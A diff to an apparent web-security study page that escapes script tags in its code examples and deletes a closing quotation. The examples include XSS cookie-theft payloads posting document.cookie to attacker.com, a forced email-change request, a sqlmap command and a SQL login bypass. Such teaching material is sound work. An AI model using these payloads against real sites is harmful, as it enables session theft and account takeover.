@@ -273,14 +273,7 @@
         }
         .back-link:hover { color: #0f0; }
 
-        .philosophy {
-            margin-top: 50px;
-            border-top: 1px solid #030;
-            padding-top: 20px;
-            color: #050;
-            font-size: 12px;
-            font-style: italic;
-        }
+
 
         @media (max-width: 600px) {
             body { font-size: 13px; padding: 12px; }
@@ -422,12 +415,12 @@ done
                     <div class="lang-need-item"><span>></span><span>use fetch() in payloads to exfiltrate data to an attacker-controlled server</span></div>
                     <div class="code-label">// real example — XSS cookie theft payload</div>
                     <div class="code-block">// basic proof-of-concept (confirms XSS exists):
-<script>alert(document.cookie)</script>
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
 // real impact payload — sends victim's cookie to attacker's server:
-<script>
+&lt;script&gt;
   fetch('https://attacker.com/log?c=' + encodeURIComponent(document.cookie))
-</script>
+&lt;/script&gt;
 
 // finding XSS sinks in source code — dangerous patterns:
 document.getElementById('out').innerHTML = userInput  // SINK — executes HTML
@@ -1060,7 +1053,7 @@ sqlmap -u "https://target.com/product?id=1" --dbs --level 3</div>
                             </div>
                             <div class="code-label">// three types in practice</div>
                             <div class="code-block">// reflected — payload in the URL, victim must click:
-https://target.com/search?q=<script>alert(document.cookie)</script>
+https://target.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
 
 // stored — saved to DB, executes for all visitors:
 // posted in a comment field:
@@ -1084,23 +1077,23 @@ https://target.com/search?q=<script>alert(document.cookie)</script>
                             </div>
                             <div class="code-label">// cookie theft → account takeover</div>
                             <div class="code-block">// payload (stored in victim's browser context):
-<script>
+&lt;script&gt;
   var img = new Image();
   img.src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
-</script>
+&lt;/script&gt;
 
 // attacker receives: session=eyJhbGci...
 // attacker sets that cookie in their browser
 // attacker is now logged in as victim — account takeover.
 
 // if HttpOnly (can't steal cookie) → use XSS to perform actions as victim:
-<script>
+&lt;script&gt;
   fetch('/account/change-email', {
     method: 'POST',
     body: 'email=attacker@evil.com',
     credentials: 'include'
   });
-</script></div>
+&lt;/script&gt;</div>
                         </div>
                     </div>
                 </div>
@@ -1671,8 +1664,8 @@ time budget:
                                 this document is built during your PortSwigger lab practice — after every lab you solve, add the key payload to your notes.
                             </div>
                             <div class="code-label">// cheat sheet structure (built over months of practice)</div>
-                            <div class="code-block">[XSS] basic:          <script>alert(1)</script>
-[XSS] cookie steal:   <script>fetch('//attacker.com?c='+document.cookie)</script>
+                            <div class="code-block">[XSS] basic:          &lt;script&gt;alert(1)&lt;/script&gt;
+[XSS] cookie steal:   &lt;script&gt;fetch('//attacker.com?c='+document.cookie)&lt;/script&gt;
 [XSS] HttpOnly bypass: use XSS+CSRF — perform action as victim via fetch()
 
 [SQLi] login bypass:  admin'--
@@ -1897,10 +1890,6 @@ remediation:
     </div>
 
     <a href="index.html" class="back-link">&lt; back to profile</a>
-
-    <div class="philosophy">
-        "the only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards." — gene spafford
-    </div>
 
 </div>
 
